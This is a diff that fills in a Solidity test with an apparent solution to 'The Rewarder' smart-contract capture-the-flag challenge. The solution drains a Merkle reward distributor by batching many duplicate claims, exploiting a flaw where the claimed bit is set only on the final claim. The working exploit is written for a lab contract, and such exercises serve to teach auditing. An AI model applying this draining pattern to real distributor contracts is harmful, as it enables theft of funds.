@@ -148,7 +148,47 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        //Idea: for subsequent claims using the same token, the bits are only set on the final claim
+        //Attack: send multiple claims for the same token to exploit the flaw in setClaimed
+
+        uint player_dvt_amount = 11524763827831882;
+        uint player_weth_amount = 1171088749244340;
+
+        uint dvt_tx_count = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_dvt_amount;
+        uint weth_tx_count = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_weth_amount;
+        uint total_tx_count = dvt_tx_count + weth_tx_count;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](total_tx_count);
+
+        for(uint i = 0; i < total_tx_count; i++) {
+            if (i < dvt_tx_count) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: player_dvt_amount,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves,188)
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: player_weth_amount,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves,188)
+                });
+            }
+        }
+
+        distributor.claimRewards(claims, tokensToClaim);
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
